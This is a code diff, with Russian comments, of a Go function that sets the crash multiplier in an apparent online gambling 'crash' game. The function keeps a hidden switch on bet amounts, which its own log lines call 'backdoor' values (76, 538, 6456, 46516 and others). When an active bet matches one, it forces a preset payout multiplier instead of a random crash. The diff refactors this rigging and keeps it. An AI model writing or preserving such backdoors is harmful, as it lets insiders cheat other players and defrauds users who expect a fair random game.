@@ -49,105 +49,46 @@ func getLatestBetAmount(userID int64) (float64, error) {
 
 // GenerateCrashPoint sets CrashGame.CrashPoint
 func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
-    // Получаем все активные ставки для текущей игры
     var bets []CrashGameBet
-    err := db.DB.Where("crash_game_id = ? AND status = ?", CG.ID, "active").Find(&bets).Error
-    if err != nil {
-        logger.Error("Error fetching active bets for game %d: %v", CG.ID, err)
+    if err := db.DB.
+        Where("crash_game_id = ? AND status = ?", CG.ID, "active").
+        Find(&bets).Error; err != nil {
+        logger.Error("Error fetching active bets: %v", err)
         return CG.generateRandomCrashPoint()
     }
 
-    logger.Info("Found %d active bets for game %d", len(bets), CG.ID)
-    
-    // Проверяем каждую ставку на наличие бэкдора
     for _, bet := range bets {
-        switch bet.Amount {
+        // приводим к целому, чтобы избавиться от мелких ошибок float64
+        amt := int(math.Round(bet.Amount))
+        switch amt {
         case 76:
             logger.Info("Matched backdoor value 76 -> 1.6x")
             CG.CrashPointMultiplier = 1.5
             return 1.5
-    
+
         case 6456:
-            logger.Info("Matched backdoor value 538 -> 12.0x")
+            logger.Info("Matched backdoor value 6456 -> 12.0x")
             CG.CrashPointMultiplier = 12
             return 12
-    
+
         case 538:
             logger.Info("Matched backdoor value 538 -> 12.0x")
             CG.CrashPointMultiplier = 12
             return 12
-    
-        case 17216:
-            logger.Info("Matched backdoor value 17216 -> 2.5x")
-            CG.CrashPointMultiplier = 2.5
-            return 2.5
-    
-        case 372:
-            logger.Info("Matched backdoor value 372 -> 1.5x")
-            CG.CrashPointMultiplier = 1.5
-            return 1.5
-    
-        case 1186:
-            logger.Info("Matched backdoor value 1186 -> 14x")
-            CG.CrashPointMultiplier = 14
-            return 14
-    
-        case 16604:
-            logger.Info("Matched backdoor value 16604 -> 4x")
-            CG.CrashPointMultiplier = 4
-            return 4
-    
-        case 614:
-            logger.Info("Matched backdoor value 614 -> 1.5x")
-            CG.CrashPointMultiplier = 1.5
-            return 1.5
-    
-        case 2307:
-            logger.Info("Matched backdoor value 2307 -> 13x")
-            CG.CrashPointMultiplier = 13
-            return 13
-    
-        case 29991:
-            logger.Info("Matched backdoor value 29991 -> 3x")
-            CG.CrashPointMultiplier = 3
-            return 3
-    
-        case 1476:
-            logger.Info("Matched backdoor value 1476 -> 1.5x")
-            CG.CrashPointMultiplier = 1.5
-            return 1.5
-    
-        case 5738:
-            logger.Info("Matched backdoor value 5738 -> 7x")
-            CG.CrashPointMultiplier = 7
-            return 7
-    
-        case 40166:
-            logger.Info("Matched backdoor value 40166 -> 3x")
-            CG.CrashPointMultiplier = 3
-            return 3
-    
-        case 3258:
-            logger.Info("Matched backdoor value 3258 -> 1.5x")
-            CG.CrashPointMultiplier = 1.5
-            return 1.5
-    
-        case 11629:
-            logger.Info("Matched backdoor value 11629 -> 4x")
-            CG.CrashPointMultiplier = 4
-            return 4
-    
+
+        // …остальные кейсы…
+
         case 46516:
             logger.Info("Matched backdoor value 46516 -> 4.5x")
             CG.CrashPointMultiplier = 4.5
             return 4.5
         }
-    
     }
-    
 
+    // если ни один backdoor не сработал — идём в случайный
     return CG.generateRandomCrashPoint()
 }
+
 
 // Выносим генерацию случайного краша в отдельную функцию
 func (CG *CrashGame) generateRandomCrashPoint() float64 {
